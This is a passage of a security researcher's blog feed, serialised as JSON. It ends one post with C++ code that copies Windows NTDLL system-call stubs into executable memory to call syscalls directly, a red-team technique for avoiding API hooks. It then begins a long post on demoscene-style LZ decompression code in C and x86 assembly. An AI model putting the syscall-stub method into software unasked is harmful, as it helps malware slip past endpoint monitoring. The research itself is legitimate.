style=\"color: #333333;\">*</span>argv[]) {\n    LDE <span style=\"color: #333333;\">*</span>lde;\n    \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(argc <span style=\"color: #333333;\">!=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>) {\n      printf(<span style=\"background-color: #fff0f0;\">\"usage: dis &lt;system call name&gt;</span><span style=\"color: #666666; font-weight: bold; background-color: #fff0f0;\">\\n</span><span style=\"background-color: #fff0f0;\">\"</span>);\n      <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n    }\n    \n    <span style=\"color: #888888;\">// create length disassembly engine</span>\n    lde <span style=\"color: #333333;\">=</span> new LDE();\n      \n    lde<span style=\"color: #333333;\">-&gt;</span>DisassembleSyscall(argv[<span style=\"color: #0000DD; font-weight: bold;\">1</span>]);\n\n    delete lde;\n    \n    <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n}\n</pre>\n</div>\n<p>Just to illustrate disassembly of NtCreateThreadEx and NtWriteVirtualMemory. The address of SharedUserData doesn&#8217;t change and therefore doesn&#8217;t require fixups to the code just because it&#8217;s been mapped somewhere else.</p>\n<p><img src=\"https://modexp.files.wordpress.com/2020/06/dis_syscall-1.png\" /></p>\n<h2>Invoking</h2>\n<p>Simply copy the code for the system call to memory allocated by VirtualAlloc with PAGE_EXECUTE_READWRITE permissions. Rewriting the above code, we have something like the following.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span>LPVOID LDE<span style=\"color: #333333;\">::</span>GetSyscallStub(LPCSTR lpSyscallName) {\n    ULONG64                       ofs, start<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>, end<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>, addr;\n    PIMAGE_DOS_HEADER             dos;\n    PIMAGE_NT_HEADERS             nt;\n    PIMAGE_DATA_DIRECTORY         dir;\n    PIMAGE_RUNTIME_FUNCTION_ENTRY rf;\n    DWORD                         i, rva;\n    SIZE_T                        len;\n    LPVOID                        cs <span style=\"color: #333333;\">=</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    <span style=\"color: #888888;\">// resolve address of function in NTDLL</span>\n    addr <span style=\"color: #333333;\">=</span> (ULONG64)GetProcAddress(lpSyscallName);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(addr <span style=\"color: #333333;\">==</span> <span style=\"color: #007020;\">NULL</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    <span style=\"color: #888888;\">// get pointer to image directories</span>\n    dir <span style=\"color: #333333;\">=</span> Dirs();\n    \n    <span style=\"color: #888888;\">// no exception directory? exit</span>\n    rva <span style=\"color: #333333;\">=</span> dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(rva <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    ofs <span style=\"color: #333333;\">=</span> rva2ofs(rva);\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">==</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #008800; font-weight: bold;\">return</span> <span style=\"color: #007020;\">NULL</span>;\n    \n    rf <span style=\"color: #333333;\">=</span> (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs <span style=\"color: #333333;\">+</span> mem);\n\n    <span style=\"color: #888888;\">// for each runtime function (there might be a better way??)</span>\n    <span style=\"color: #008800; font-weight: bold;\">for</span>(i<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>; rf[i].BeginAddress <span style=\"color: #333333;\">!=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>; i<span style=\"color: #333333;\">++</span>) {\n      <span style=\"color: #888888;\">// is it our system call?</span>\n      start <span style=\"color: #333333;\">=</span> rva2ofs(rf[i].BeginAddress) <span style=\"color: #333333;\">+</span> (ULONG64)mem;\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(start <span style=\"color: #333333;\">==</span> addr) {\n        <span style=\"color: #888888;\">// save the end and calculate length</span>\n        end <span style=\"color: #333333;\">=</span> rva2ofs(rf[i].EndAddress) <span style=\"color: #333333;\">+</span> (ULONG64)mem;\n        len <span style=\"color: #333333;\">=</span> (SIZE_T) (end <span style=\"color: #333333;\">-</span> start);\n        \n        <span style=\"color: #888888;\">// allocate RWX memory</span>\n        cs <span style=\"color: #333333;\">=</span> VirtualAlloc(<span style=\"color: #007020;\">NULL</span>, len,  MEM_COMMIT <span style=\"color: #333333;\">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(cs <span style=\"color: #333333;\">!=</span> <span style=\"color: #007020;\">NULL</span>) {\n          <span style=\"color: #888888;\">// copy stub to memory</span>\n          CopyMemory(cs, (<span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">void</span><span style=\"color: #333333;\">*</span>)start, len);\n        }\n        <span style=\"color: #008800; font-weight: bold;\">break</span>;\n      }\n    }\n    <span style=\"color: #888888;\">// return pointer to code stub</span>\n    <span style=\"color: #008800; font-weight: bold;\">return</span> cs;\n}\n</pre>\n</div>\n<h2>Summary</h2>\n<p>Invoking system calls via remapping of the NTDLL.dll is of course the simplest approach. A lightweight LDE and CFG with no dependencies on external libraries would be useful for other Red Teaming activities like hooking API or even detecting hooked functions. It could also be used for locating GetProcAddress without touching the Export Address Table (EAT) or Import Address Table (IAT). However, GetSyscallStub demonstrates that you don&#8217;t need a disassembler just to read the code stub.</p>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/feed/",
            "slash_comments": "1",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/06/dis_syscall-1.png"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/06/dis_syscall-1.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Shellcode: Recycling Compression Algorithms for the Z80, 8088, 6502, 8086, and 68K Architectures.",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Shellcode: Recycling Compression Algorithms for the Z80, 8088, 6502, 8086, and 68K Architectures."
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/05/27/komposite-shellcode/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/05/27/komposite-shellcode/",
            "comments": "https://modexp.wordpress.com/2020/05/27/komposite-shellcode/#comments",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Wed, 27 May 2020 01:00:16 +0000",
            "published_parsed": [
                2020,
                5,
                27,
                1,
                0,
                16,
                2,
                148,
                0
            ],
            "tags": [
                {
                    "term": "compression",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "encryption",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "iot",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "linux",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "optimization",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "programming",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "arithmetic",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "demoscene",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "huffman",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lz1",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lz4",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lz77",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lzb",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lze",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lzma",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lzo",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lzoma",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lzsa",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "lzss",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "nrv",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "retro",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shannon",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "upx",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=4580",
            "guidislink": false,
            "summary": "Recycling Compression Algorithms for the Z80, 8088, 6502, 8086, and 68K Architectures. Contents Introduction History Entropy Coding Universal code Lempel-Ziv (LZ77/LZ1) Lempel-Ziv-Storer-Szymanski (LZSS) Lempel-Ziv-Bell (LZB) Intel 8088 / 8086 LZE LZ4 LZSA aPLib MOS Technology 6502 Exomizer Pucrunch Zilog 80 &#8230; <a href=\"https://modexp.wordpress.com/2020/05/27/komposite-shellcode/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Recycling Compression Algorithms for the Z80, 8088, 6502, 8086, and 68K Architectures. Contents Introduction History Entropy Coding Universal code Lempel-Ziv (LZ77/LZ1) Lempel-Ziv-Storer-Szymanski (LZSS) Lempel-Ziv-Bell (LZB) Intel 8088 / 8086 LZE LZ4 LZSA aPLib MOS Technology 6502 Exomizer Pucrunch Zilog 80 &#8230; <a href=\"https://modexp.wordpress.com/2020/05/27/komposite-shellcode/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<p>    Recycling Compression Algorithms for the Z80, 8088, 6502, 8086, and 68K Architectures.</p>\n<h2>Contents</h2>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#intro\">Introduction</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#history\">History</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#coding\">Entropy Coding</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#uni\">Universal code</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lz1\">Lempel-Ziv (LZ77/LZ1)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzss\">Lempel-Ziv-Storer-Szymanski (LZSS)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzb\">Lempel-Ziv-Bell (LZB)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#8088\">Intel 8088 / 8086</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#lze\">LZE</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lz4\">LZ4</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzsa\">LZSA</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#aplib\">aPLib</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#6502\">MOS Technology 6502</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#exo\">Exomizer</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#pucrunch\">Pucrunch</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#z80\">Zilog 80</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#mlz\">Mega LZ</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#zx7\">ZX7</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#zx7_mini\">ZX7 Mini</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzf\">LZF</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#68k\">Motorola 68000</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#packfire\">PackFire</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#shrinkler\">Shrinkler</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#misc\">C/x86 ASM</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzrw\">Lempel-Ziv Ross Williams (LZRW)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#ulz\">Ultra-fast LZ (ULZ)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#blz\">BriefLZ</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#nrv2b\">Not Really Vanished (NRV)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzma\">Lempel\u2013Ziv\u2013Markov Algorithm (LZMA)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#lzoma\">Lempel\u2013Ziv\u2013Oberhumer-Markov Algorithm (LZOMA)</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#kkrunchy\">KKrunchy</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#results\">Results</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#sum\">Summary</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#ack\">Acknowledgements</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#res\">Further Research</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#dox\">Documentaries and Interviews</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#sites\">Websites, Blogs and Forums</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#demos\">Demoscene Productions</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#tools\">Tools</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#other\">Other Compression Algorithms</a></li>\n</ol>\n</ol>\n<h2 id=\"intro\">1. Introduction</h2>\n<p><a href=\"https://modexp.wordpress.com/2019/12/08/shellcode-compression/\">My last post</a> about compression inadvertently missed algorithms used by the <a href=\"https://en.wikipedia.org/wiki/Demoscene\">Demoscene</a> that I attempt to correct here. Except for research by <a href=\"http://www.pouet.net/user.php?who=95769\">Introspec</a> about various <a href=\"http://hype.retroscene.org/blog/dev/740.html\">8-Bit algorithms</a> on the <a href=\"https://www.worldofspectrum.org/\">ZX Spectrum</a>, it\u2019s tricky to find information in one location about compression used in Demoscene productions. The focus here will be on variations of the Lempel-Ziv (LZ) scheme published in 1977 that are suitable for resource-constrained environments such as 8, 16, and 32-bit home computers released in the 1980s. In executable compression, we can consider LZ an umbrella term for LZ77, LZSS, LZB, LZH, LZARI, and any other algorithms inspired by those designs.</p>\n<p>Many variations of LZ surfaced in the past thirty years, and a detailed description of them all would be quite useful for historical reference. However, the priority for this post is exploring algorithms with the best ratios that also use the least amount of code possible for decompression. Considerations include an open-source compressor and the speed of compression and decompression. However, some decoders without sources for a compressor are also useful to show the conversion between architectures.</p>\n<p><a href=\"https://modexp.wordpress.com/about/\">Drop me an email</a>, if you would like to provide feedback on this post. x86 assembly codes for some of algorithms discussed here may be <a href=\"https://github.com/odzhan/shellcode/tree/master/compression\">found here.</a></p>\n<h2 id=\"history\">2. History</h2>\n<p><strong><em>Designing a compression format requires trade-offs, such as compression ratio, compression speed, decompression speed, code complexity,  code size, memory usage, etc. For executable compression in particular, where the sum of decompression code size and compressed size is what counts, the optimal balance between these two depends on the intended target size.</em></strong> &#8211; <a href=\"https://github.com/askeksa\">Aske Simon Christensen</a>, author of <a href=\"https://github.com/askeksa/Shrinkler\">Shrinkler</a> and co-author of <a href=\"http://www.crinkler.net/\">Crinkler</a>.</p>\n<p>\nSince the invention of telegraphy, telephony, and especially television, engineers have sought ways to reduce the bandwidth required for transmitting electrical signals. Before the invention of <a href=\"https://en.wikipedia.org/wiki/Analog-to-digital_converter\">analog-to-digital</a> converters and entropy coding methods in the 1950s, compaction of television signals required reducing the quality of the video before transmission, a technique that\u2019s referred to as <em>lossy</em> compression. <a href=\"https://dl.acm.org/doi/10.1109/TIT.1967.1053949\">Many publications</a> on compressing television signals surfaced between the 1950s-1970s, and these eventually proved to be useful in other applications, most notably for the aerospace industry.</p>\n<p>For example, various interplanetary spacecraft launched in the 1960s could record data faster than what they could transmit to earth. And <a href=\"https://commons.erau.edu/cgi/viewcontent.cgi?article=2698&amp;context=space-congress-proceedings\">following a review</a> of unclassified space missions in the early 1960s, in particular, the <a href=\"https://mars.nasa.gov/mars-exploration/missions/mariner-3-4/\">Mariner Mars mission of 1964</a>, NASA\u2019s Jet Propulsion Laboratory examined various compression methods for acquiring images in space. The first unclassified spacecraft to use image compression was Explorer 34 or <a href=\"https://en.wikipedia.org/wiki/Explorer_34\">Interplanetary Monitoring Platform 4 (IMP-4)</a> launched in 1967. It used <a href=\"https://en.wikipedia.org/wiki/Chroma_subsampling\">Chroma subsampling</a>, invented in the 1950s specifically for color television. This method, which eventually became part of the JPEG standard, would continue being used by NASA until the invention of a more optimal encoding method called <a href=\"https://en.wikipedia.org/wiki/Nasir_Ahmed_(engineer)\">Discrete Cosine Transform (DCT)</a></p>\n<p>The increase of computer mainframes in the 1950s and the collection of data on citizens for social science motivated prior research and development of <em>lossless</em> compression techniques. Microprocessors became inexpensive in the late 1970s, leading the way for average consumers to purchase a computer of their own. However, this didn\u2019t immediately reduce the cost of disk storage. And the vast majority of user data remained stored on magnetic tapes or floppy diskettes rather than hard disk drives offered only as an optional component.</p>\n<p>Hard disk drives remained expensive between 1980-2000, encouraging the development of tools to reduce the size of files. The first program to compress executables on the PC was <a href=\"http://www.os2museum.com/wp/realia-spacemaker/\">Realia Spacemaker</a>, which was written by <a href=\"https://en.wikipedia.org/wiki/Robert_Dewar\">Robert Dewar</a> and published in 1982. The precise algorithm used by this program remains undocumented. However, the year of publication would suggest it uses Run-length encoding (RLE). <a href=\"http://pferrie.epizy.com/?i=1Q\">Qkumba</a> informed me about two things via email. First, games for the Apple II used RLE in the early 1980s for shrinking images used as title screens. Examples include <a href=\"https://en.wikipedia.org/wiki/Beach_Head_(video_game)\">Beach-Head</a>, <a href=\"https://en.wikipedia.org/wiki/G.I._Joe:_A_Real_American_Hero_(video_game)\">G.I. Joe</a> and <a href=\"https://en.wikipedia.org/wiki/Black_Magic_(video_game)\">Black Magic</a>, to name a few. Second, games by <a href=\"http://www.infocom-if.org/games/games.html\">Infocom</a> used Huffman-like text compression. <a href=\"http://www.os2museum.com/wp/exepack-and-the-a20-gate/\">Microsoft EXEPACK</a> by Reuben Borman and published in 1985 also used RLE for compression.</p>\n<p><a href=\"https://twitter.com/h_okumura\">Haruhiko Okumura</a> uploaded <a href=\"https://oku.edu.mie-u.ac.jp/~okumura/compression/history.html\">an implementation of the LZSS compression algorithm</a> to a Bulletin Board System (BBS) in 1988. Inspired by Okumura, <a href=\"https://bellard.org/\">Fabrice Bellard</a> published <a href=\"https://bellard.org/lzexe.html\">LZEXE</a> in 1989, which appears to be the first executable compressor to use LZSS.</p>\n<h2 id=\"coding\">3. Entropy Coding</h2>\n<p>Samuel Morse published his coding system for the electrical telegraph in 1838. It assigned short symbols for the most common letters of an alphabet, and this may be the first example of compression used for electrical signals. An entropy coder works similarly. It removes redundancy by assigning short codewords for symbols occurring more frequently and longer codewords for symbols with less frequency. The following table lists some examples.</p>\n<table id=\"t01\">\n<tr>\n<th>Type</th>\n<th>Publication and Author</th>\n</tr>\n<tr>\n<td>Shannon</td>\n<td><a href=\"http://people.math.harvard.edu/~ctm/home/text/others/shannon/entropy/entropy.pdf\">A Mathematical Theory of Communication</a> published in 1948 by <a href=\"https://www.itsoc.org/about/shannon\">Claude E. Shannon</a>.</td>\n</tr>\n<tr>\n<td>Huffman</td>\n<td><a href=\"https://www.ic.tu-berlin.de/fileadmin/fg121/Source-Coding_WS12/selected-readings/10_04051119.pdf\">A Method for the Construction of Minimum Redundancy Codes</a> published in 1952 by <a href=\"https://en.wikipedia.org/wiki/David_A._Huffman\">David A. Huffman</a>.</td>\n</tr>\n<tr>\n<td>Arithmetic</td>\n<td><a href=\"https://pdfs.semanticscholar.org/9fcb/8d85e3d429f3816861fc7999e1bb68eefd39.pdf\">Generalized Kraft Inequality and Arithmetic Coding</a> published in 1976 by <a href=\"https://cml.rhul.ac.uk/people/rissanen/\">Jorma Rissanen</a>.</td>\n</tr>\n<tr>\n<td>Range</td>\n<td>There are two papers of interest here. One is <a href=\"https://www.richpasco.org/scaffdc.pdf\">Source Coding Algorithms for Fast Data Compression</a> published in 1976 by <a href=\"https://www.richpasco.org/\">Richard Clark Pasco</a>. The other is <a href=\"http://www.compressconsult.com/rangecoder/#download\">Range encoding: An Algorithm for Removing Redundancy from a Digitised Message</a> published in 1979 by G.N.N. Martin.</td>\n</tr>\n<tr>\n<td>ANS</td>\n<td><a href=\"https://arxiv.org/pdf/1311.2540.pdf\">Asymmetric Numeral Systems: Entropy Coding Combining Speed of Huffman Coding with Compression Rate of Arithmetic Coding</a> published in 2014 by <a href=\"http://th.if.uj.edu.pl/~dudaj/\">Jaros\u0142aw Duda</a>.</td>\n</tr>\n</table>\n<p>Arithmetic or range coders fused with an LZ77-style compressor result in high compression ratios and compact decompressors, which makes them attractive to the demoscene. They are slower than a Huffman coder, but much more efficient. ANS is the favored coder used in mission-critical systems today, providing efficiency and speed.</p>\n<h2 id=\"uni\">4. Universal Code</h2>\n<p>There are many variable-length coding methods used for integers of arbitrary upper bound, and most of the algorithms presented in this post use Elias gamma coding for the offset and length of a match reference. The following table contains a list of papers referenced in <a href=\"http://www.firstpr.com.au/audiocomp/lossless/TechRep137.pdf\">Punctured Elias Codes for variable-length coding of the integers</a> published by <a href=\"https://www.cs.auckland.ac.nz/~peter-f/\">Peter Fenwick</a> in 1996.</p>\n<table id=\"t01\">\n<thead>\n<tr>\n<th>Coding</th>\n<th>Author and publication</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Golomb</td>\n<td><a href=\"https://ieeexplore.ieee.org/document/1053907\">Run-length encodings</a> published in 1966 by <a href=\"https://writings.stephenwolfram.com/2016/05/solomon-golomb-19322016/\">Solomon W. Golomb</a>.</td>\n</tr>\n<tr>\n<td>Levenshtein</td>\n<td><a href=\"http://www.compression.ru/download/articles/int/levenstein_1968_on_the_redundancy_and_delay.pdf\">On the redundancy and delay of separable codes for the natural numbers.</a> published in 1968 by <a href=\"https://www.keldysh.ru/departments/dpt_10/lev.html\">Vladimir I. Levenshtein</a>.</td>\n</tr>\n<tr>\n<td>Elias</td>\n<td><a href=\"https://ieeexplore.ieee.org/document/1055349\">Universal Codeword Sets and Representations of the Integers</a> published in 1975 by <a href=\"https://www.nae.edu/29439/Dr-Peter-Elias\">Peter Elias</a>.</td>\n</tr>\n<tr>\n<td>Rodeh-Even</td>\n<td><a href=\"https://dl.acm.org/doi/pdf/10.1145/359460.359480\">Economical Encoding of Commas Between Strings</a> published in 1978 by <a href=\"https://dblp.uni-trier.de/pers/r/Rodeh:Michael.html\">Michael Rodeh</a> and <a href=\"http://www.wisdom.weizmann.ac.il/~oded/even-tech03.html\">Shimon Even</a>.</td>\n</tr>\n<tr>\n<td>Rice</td>\n<td><a href=\"https://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/19790014634.pdf\">Some Practical Universal Noiseless Coding Techniques</a> published in 1979 by <a href=\"https://www.researchgate.net/scientific-contributions/5854241_Robert_F_Rice\">Robert F. Rice</a>.</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"lz1\">5. Lempel-Ziv (LZ77/LZ1)</h2>\n<p>Designed by <a href=\"http://www.cs.technion.ac.il/people/lempel/\">Abraham Lempel</a> and <a href=\"https://www.researchgate.net/profile/Jacob_Ziv\">Jacob Ziv</a> and described in <a href=\"https://www2.cs.duke.edu/courses/spring03/cps296.5/papers/ziv_lempel_1977_universal_algorithm.pdf\">A Universal Algorithm for Sequential Data Compression</a> published in 1977. It compresses files by searching for the repetition of strings or sequences of bytes and storing a reference pointer and length to an earlier occurrence. The size of a reference pointer and length will define the overall speed of the compression and compression ratio. The following decoder uses a 12-Bit reference pointer (4096 bytes) and 4-Bit length (16 bytes). It will work with a <a href=\"https://github.com/andyherbert/lz1\">a compressor</a> written by <a href=\"https://github.com/andyherbert\">Andy Herbert</a>. However, you must change the compressor to use 16-bits for a match reference. Charles Bloom discusses <a href=\"http://cbloomrants.blogspot.com/2011/10/10-27-11-tiny-lz-decoder.html\">small LZ decoders in a blog post</a> that may be of interest to readers.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #333399; font-weight: bold;\">uint32_t</span> <span style=\"color: #0066BB; font-weight: bold;\">lz77_depack</span>(\n  <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>outbuf, \n  <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> outlen, \n  <span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>inbuf) \n{\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> ofs, len;\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>  <span style=\"color: #333333;\">*</span>in, <span style=\"color: #333333;\">*</span>out, <span style=\"color: #333333;\">*</span>end, <span style=\"color: #333333;\">*</span>ptr;\n    \n    in  <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)inbuf;\n    out <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;\n    end <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">+</span> outlen;\n    \n    <span style=\"color: #008800; font-weight: bold;\">while</span>(out <span style=\"color: #333333;\">&lt;</span> end) {\n      len <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>(<span style=\"color: #333399; font-weight: bold;\">uint16_t</span><span style=\"color: #333333;\">*</span>)in;\n      in <span style=\"color: #333333;\">+=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>;\n      ofs <span style=\"color: #333333;\">=</span> len <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>; \n      \n      <span style=\"color: #888888;\">// offset?</span>\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs) {\n        <span style=\"color: #888888;\">// copy reference</span>\n        len <span style=\"color: #333333;\">=</span> (len <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">15</span>) <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n        ptr <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">-</span> ofs;\n        <span style=\"color: #008800; font-weight: bold;\">while</span>(len<span style=\"color: #333333;\">--</span>) <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>ptr<span style=\"color: #333333;\">++</span>;\n      }\n      <span style=\"color: #888888;\">// copy literal</span>\n      <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>in<span style=\"color: #333333;\">++</span>;\n    }\n    <span style=\"color: #888888;\">// return depacked length</span>\n    <span style=\"color: #008800; font-weight: bold;\">return</span> (out <span style=\"color: #333333;\">-</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf);\n}\n</pre>\n</div>\n<p>The assembly is optimized for size, currently at 54 bytes.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lz77_depack:</span>\n<span style=\"color: #000000;\">_lz77_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    \n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>           <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">ebx</span>, [<span style=\"color: #A90D91;\">eax</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">edi</span>]     <span style=\"color: #177500;\">; ebx = outlen + outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>           <span style=\"color: #177500;\">; esi = inbuf</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>\n<span style=\"color: #000000;\">lz77_main:</span>\n    <span style=\"color: #000000;\">cmp</span>    <span 